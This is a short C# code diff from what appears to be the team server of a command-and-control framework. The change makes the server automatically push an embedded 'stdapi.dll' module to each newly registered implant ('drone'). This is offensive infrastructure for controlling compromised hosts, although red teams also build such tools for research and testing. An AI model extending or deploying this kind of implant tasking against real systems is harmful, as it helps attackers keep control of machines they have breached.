@@ -24,13 +24,20 @@ namespace TeamServer.Services
                 await _server.HandleC2Message(message);
         }
 
-        public C2Message GetDroneTasks(DroneMetadata metadata)
+        public async Task<C2Message> GetDroneTasks(DroneMetadata metadata)
         {
             var drone = _drones.GetDrone(metadata.Guid);
 
             if (drone is null)
             {
                 drone = new Drone(metadata);
+                
+                // new drone, send stdapi.dll
+                drone.TaskDrone(new DroneTask("core", "load-module")
+                {
+                    Artefact = await Utilities.GetEmbeddedResource("stdapi.dll")
+                });
+                
                 _drones.AddDrone(drone);
             }
                 
